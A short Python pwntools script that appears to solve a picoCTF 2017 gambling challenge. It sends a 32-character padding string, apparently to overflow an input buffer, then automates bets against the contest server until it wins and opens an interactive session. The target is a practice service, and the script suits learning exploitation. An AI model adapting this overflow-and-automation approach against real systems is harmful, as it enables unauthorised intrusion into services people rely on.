from pwn import *

conn = remote('shell2017.picoctf.com', 44698)


def get_input():
    global conn
    out = ''
    line = conn.recvline()
    while line:
        out += line
        line = conn.recvline(timeout=1)
    return out.strip()

print get_input()
conn.sendline('A'*32)
print conn.recvline()
next_bet = 1
coins = get_input()
coins = int(coins.split('\n')[0].split()[-2])

while True:
    print 'I have: ', coins
    conn.sendline(str(next_bet))
    res = get_input()
    print res
    coins = res.split('\n')[-2].split()[-2]
    if 'You won the game' in res:
        conn.interactive()
        break
    elif 'You actually won' in res:
        next_bet = int(coins)
